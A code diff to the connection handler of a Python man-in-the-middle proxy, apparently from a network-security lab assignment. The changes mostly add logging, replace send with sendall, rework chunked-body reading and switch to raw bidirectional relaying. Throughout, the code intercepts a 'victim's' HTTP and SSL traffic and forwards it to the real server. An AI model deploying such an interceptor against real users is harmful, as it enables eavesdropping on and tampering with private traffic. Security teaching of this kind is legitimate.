@@ -15,6 +15,7 @@ class handler(threading.Thread):
     def __init__(self,socket, port) :
         threading.Thread.__init__(self)
         self.socket=socket
+        self.client_port = socket.getpeername()[1]
         self.default_port = port
         # A flag to denote ssl state
         self.sslenable = False
@@ -41,7 +42,7 @@ class handler(threading.Thread):
             sock = ssl.wrap_socket(sock)
 
         addr = Socket.gethostbyname(host)
-        print 'connect to server {} {} {}'.format(host, addr, port)
+        print 'connect to server [{} {} {}] from client [{}]'.format(host, addr, port, self.socket.getpeername()[1])
         sock.connect((addr, port))
         return sock
 
@@ -66,8 +67,6 @@ class handler(threading.Thread):
         #This function read the http header from socket
         header = ""
         line = SourceSock.recv(1)
-        if not line:
-            return
 
         data = line
         while len(line) :
@@ -96,14 +95,16 @@ class handler(threading.Thread):
 
         body = ""
         if 'Transfer-Encoding' in dicHeader and dicHeader['Transfer-Encoding'] == 'chunked' :
-            while True :
-                line = self.ReadLine(SourceSock)
-                body += line
-                chunkSize = int(line,16)
-                if chunkSize == 0 :
-                    break
+            line = self.ReadLine(SourceSock)
+            body += line
+            chunkSize = int(line,16)
+            print "chunk size is {}".format(chunkSize)
+            #while True :
+
+            if chunkSize != 0 :
                 line = self.ReadNum(SourceSock,chunkSize+2)
                 body += line
+
         else :
             if 'Content-Length' in dicHeader :
                 length = int(dicHeader['Content-Length'])
@@ -118,7 +119,7 @@ class handler(threading.Thread):
             #self.PrinfContent(body)
         return header,body
 
-    def PrinfContent(self,content):
+    def PrintContent(self,content):
         index = 0
         part = 0x10
         print '[PrintContent]'
@@ -159,6 +160,9 @@ class handler(threading.Thread):
 
         return host,port
 
+    def simpleRead(self, socket):
+        return socket.recv(8192)
+
     def run(self):
         # The main function for MITM
         # You need to do
@@ -170,14 +174,16 @@ class handler(threading.Thread):
         request = self.ReadHttp(self.socket)
         host,port = self.getHostFromHeader(request[0])
 
-        if ("icloud" in host) or ("dropbox" in host):
+        if ("icloud" in host) or ("dropbox" in host) or ("apple" in host):
             return
 
         # if ("wiki" not in host) and ("neverssl" not in host):
         #     print 'return'
         #     return
 
-        print '{0} {1}'.format(host, port)
+        #if "facebook" not in host:
+        #    return
+
         if self.sslenable == True:
             #try:
                 self.socket = self.initSSLConnection(self.socket)
@@ -187,25 +193,25 @@ class handler(threading.Thread):
             #    print host
             #    print ex
 
-        #print "ssl is enable"
+        print request[0]
 
         #if host.rstrip() != "140.113.207.95":
             #print "return!!!!!!!!!!!!!"
             #return
         rsock = self.CreateSocketAndConnectToOriginDst(host, int(port))
 
-        print "==================== Client Request  ================================"
         # 4. Forward the request sent by user to the fakeSocket
-        # ==============Your Code Here !! ====================================
-        rsock.send(request[0]+request[1])
+        rsock.sendall(request[0]+request[1])
 
-        print "Client Request Forwarding Success"
-        print "==================== server response  ================================"
+        print "Client [{}] Request Forwarding Success".format(self.client_port)
         # 5. Read response from fakeSocket and forward to victim's socket
         # 6. close victim's socket and fakeSocket
-        # ==============Your Code Here !! ====================================
         response = self.ReadHttp(rsock)
-        self.socket.send(response[0]+response[1])
+        print "Server [{}] responded to client [{}]".format(host, self.client_port)
+        #print "server msg: " + response[0]
+        #self.PrintContent(response[1])
+        self.socket.sendall(response[0]+response[1])
+        print "Server sent"
                 
         inputs = [ rsock, self.socket ]
         outputs = []
@@ -214,25 +220,30 @@ class handler(threading.Thread):
             for s in readable:
                 if s is rsock:
                     raddr = rsock.getsockname()
-                    print '{0} {1} read server'.format(host, raddr[1])
+                    #print '{0} {1} read server'.format(host, raddr[1])
                     #rsock.setblocking(True)
-                    res = self.ReadHttp(s)
+                    #res = self.ReadHttp(s)
+                    res = self.simpleRead(s)
                     if res:
-                        self.socket.send(res[0] + res[1])
+                        #self.PrintContent(res)
+                        self.socket.sendall(res)
                     else:
-                        print '{0} {1} server close'.format(host, raddr[1])
+                        print 'server [{} {}] close to client [{}]'.format(host, raddr[1], self.client_port)
                         self.socket.close()
                         rsock.close()
                         return
                 else:
                     raddr = s.getpeername()
-                    print '{0} {1} read client'.format(host, raddr[1])
+                    #print '{0} {1} read client'.format(host, raddr[1])
                     #self.socket.setblocking(True)
-                    res = self.ReadHttp(self.socket)
+                    #res = self.ReadHttp(self.socket)
+                    res = self.simpleRead(s)
                     if res:
-                        rsock.send(res[0] + res[1])
+                        #rsock.send(res[0] + res[1])
+                        #self.PrintContent(res)
+                        rsock.sendall(res)
                     else:
-                        print '{0} {1} client close'.format(host, raddr[1])
+                        print 'server [{} {}] was closed by client [{}]'.format(host, raddr[1], self.client_port)
                         self.socket.close()
                         rsock.close()
                         return
